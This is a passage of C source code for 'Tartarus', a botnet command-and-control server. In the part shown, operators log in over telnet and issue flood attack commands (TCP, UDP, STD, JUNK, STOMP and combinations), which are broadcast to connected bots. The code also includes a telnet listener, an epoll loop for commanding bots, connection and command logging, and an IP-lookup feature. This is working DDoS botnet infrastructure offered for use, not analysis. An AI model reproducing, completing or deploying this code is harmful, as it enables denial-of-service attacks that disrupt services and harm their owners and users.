                            memset(iplookup_host_token, 0, sizeof(iplookup_host_token));
                        }
                        else if(strstr(iplbuffer, "nickers"))
                            sprintf(botnet, "\x1b[31m[IPLookup] Failed, Hosting server needs to have php installed for api to work...\x1b[0m\r\n");
                        else sprintf(botnet, "[+] \x1b[0m--- Results\x1b[0m --- [+]\r\n\x1b[0m%s\x1b[37m\r\n", iplbuffer);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
                        //printf("[\x1b[31m-\x1b[37m] Failed to send request headers...\n");
                        sprintf(botnet, "\x1b[31m[IPLookup] Failed to send request headers...\r\n");
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                close(IPLSock);
            }
        }
        if(strstr(buf, ".logout")  || strstr(buf, ".LOGOUT"))
        {
        printf("\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mHas Logged Out!\n", accounts[find_line].user, buf); // We Are Attempting To Logout!
        FILE *logFile;// We Are Attempting To Logout!
        logFile = fopen("Tartarus_Logout.log", "a");// We Are Attempting To Logout!
        fprintf(logFile, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m]\e[38;5;202m User\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\e[38;5;202m Has Logged Out!\n", accounts[find_line].user, buf);// We Are Attempting To Logout!
        fclose(logFile);// We Are Attempting To Logout!
        goto end; // We Are Dropping Down to end:
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STOP")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "              \e[38;5;201m╔═══════════════════════════════╗\r\n              \e[38;5;201m║      \e[38;5;202mWhy did you stop? ):     \e[38;5;201m║\r\n              \e[38;5;201m║  \e[38;5;202mTesting something perhaps?   \e[38;5;201m║\r\n              \e[38;5;201m║  \e[38;5;202mMeh, its oki, i stopped </3  \e[38;5;201m║\r\n              \e[38;5;201m╚═══════════════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "CRUSH")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: CRUSH        \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: STD x TCP     \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "COMBO")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: COMBO        \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: JUNK x HOLD   \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "TCP")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!         \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: TCP          \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: TCPFLOOD      \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "UDP")) 
        {  // Let Us Continue Our Journey! ╚═════════════════════════════╝ X 31 ||  
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: UDP         \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: UDPFLOOD     \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STD")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!      \e[38;5;201m   ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: STD       \e[38;5;201m   ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: STDFLOOD   \e[38;5;201m   ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "STOMP")) 
        {  // Let Us Continue Our Journey!
        sprintf(botnet, "     \e[38;5;201m╔════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!           \e[38;5;201m║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: STOMP          \e[38;5;201m╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: UDP x STD x TCP \e[38;5;201m║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚════════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if(strstr(buf, "JUNK")) 
        {  // Let Us Continue Our Journey! ╚══════════════════════╝ x 24 || ╔════════════════════════╗ x 26
        sprintf(botnet, "     \e[38;5;201m╔══════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mAttack Sent!        \e[38;5;201m ║      ╔════════════════════════════╗\r\n     \e[38;5;201m║ \e[38;5;202mMethod: JUNK        \e[38;5;201m ╠══════╣ \e[38;5;202m. STOP to stop the attack! \e[38;5;201m║\r\n     \e[38;5;201m║ \e[38;5;202mUsage: JUNKFLOOD    \e[38;5;201m ║      ╚════════════════════════════╝\r\n     \e[38;5;201m╚══════════════════════╝\r\n");           
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;                             
        }  // Let Us Continue Our Journey!
        if (strstr(buf, "EXIT") || strstr(buf, "exit"))  // We Are Closing Connection!
        { // Let Us Continue Our Journey!
        goto end; // We Are Dropping Down to end:
        } // Let Us Continue Our Journey!
        trim(buf);
        sprintf(botnet, "\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m@\e[38;5;202mTartarus\e[38;5;93m]\e[38;5;154m$\e[38;5;202m ", accounts[find_line].user, buf);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(strlen(buf) == 0) continue;
        printf("\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;201m- \e[38;5;202mCommand\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\n",accounts[find_line].user, buf);
        FILE *logFile;
        logFile = fopen("Tartarus_C2.log", "a");
        fprintf(logFile, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mUser\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m] \e[38;5;93m- \e[38;5;202mCommand\e[38;5;93m:[\e[38;5;202m%s\e[38;5;93m]\n", accounts[find_line].user, buf);
        fclose(logFile);
        broadcast(buf, thefd, usernamez);
        memset(buf, 0, 2048);
        } // Let Us Continue Our Journey!
        end:    // cleanup dead socket
        managements[thefd].connected = 0;
        close(thefd);
        managesConnected--;
}
 
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("[Tartarus] Screening Error");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {  printf("\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mIncoming User Connection From ");
       
        client_addr(cli_addr);
        FILE *logFile;
        logFile = fopen("Tartarus_Connection.log", "a");
        fprintf(logFile, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mIncoming User Connection From \e[38;5;202mIP:\e[38;5;93m[\e[38;5;202m%d.%d.%d.%d\e[38;5;93m]\n",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
        fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
        if (threads > 1000)
        {
        printf("[Tartarus] Thread Limit Exceeded! Please Lower Threat Count!\n");
        return 0;
        }
        else if (threads < 1000)
        {
        printf("");
        }
        printf("\e[38;5;201m╔═══════════════════════════════════╗\r\n\e[38;5;201m║         \e[38;5;93mWelcome To Tartarus         \e[38;5;201m║\r\n\e[38;5;201m║         \e[38;5;93mC2 x Telnet Layer         \e[38;5;201m╠════════╗\r\n\e[38;5;201m║  \e[38;5;93mServer Is Sucessfully Screened!  \e[38;5;201m║        ║     ╔════════════════════════╗\r\n\e[38;5;201m╚═════╦═════════════════════════════╝        ╚═════╣ \e[38;5;93mVexvain \e[38;5;201m║\r\n      \e[38;5;201m║                                            ╚═════╦══════════════════╝\r\n      \e[38;5;201m║   ╔════╗                                         \e[38;5;201m║\r\n      \e[38;5;201m╚═══╣ \e[38;5;93m<3 \e[38;5;201m╠═════╗         ╔════════════╗            \e[38;5;201m║\r\n          \e[38;5;201m╚════╝     ║         ║ \e[38;5;93mRIP Katura \e[38;5;201m╠════════════╝\r\n                     \e[38;5;201m║         ╚═══╦════════╝\r\n                     \e[38;5;201m║             ║\r\n                     \e[38;5;201m║             ║\r\n                     \e[38;5;201m╚═════════════╝\r\n");
        listenFD = create_and_bind(argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort();
    
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort();
 
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
        perror ("listen");
        abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
        perror ("epoll_create");
        abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
        perror ("epoll_ctl");
        abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
        pthread_create( &thread[threads + 1], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
        broadcast("PING", -1, "STRING");
        sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
